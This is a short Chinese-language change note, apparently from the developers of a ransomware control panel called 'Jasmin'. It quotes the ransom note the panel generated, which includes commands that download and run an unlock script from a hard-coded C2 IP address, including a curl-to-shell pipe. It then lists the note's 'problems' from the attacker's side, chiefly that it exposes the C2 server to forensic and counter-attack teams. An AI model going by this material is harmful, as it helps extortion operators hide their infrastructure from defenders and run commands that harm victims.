# 一、改动前：勒索信里写了什么

`Web Panel/generate.php` 原 `build_ransom_note()` 会按平台拼出：

```
Contact: jasmin@protonmail.com

How to Decrypt:
Windows (requires PowerShell 7+)
  curl.exe -sL http://34.2.145.178:8080/payloads/jasmin_unlock.ps1 -o unlock.ps1
  pwsh -File unlock.ps1 -Server http://34.2.145.178:8080 -K "<passphrase>"
  (Decrypts ALL encrypted files by default; append specific folders to limit scope)

Sha-256 integrity verification guarantees 100% file restoration.
```

Linux / macOS 走 `curl -sL …/jasmin_unlock.sh | sh -s …`；ESXi / QNAP / Synology 还会额外教受害者"先开 SSH、进哪个菜单"。三个问题：

1. **把解密工具的下发地址直接交给受害者**（`/payloads/jasmin_unlock.ps1`）；
2. **明文暴露 C2 服务器地址**（`http://34.2.145.178:8080`）—— 该地址同样出现在 `{{C2_URL}}` 之外，等于给取证/反制方一个可直接访问的面板入口；
3. ESXi/NAS 分支还建议受害者开启 SSH，属于**主动扩大攻击面**的指引。
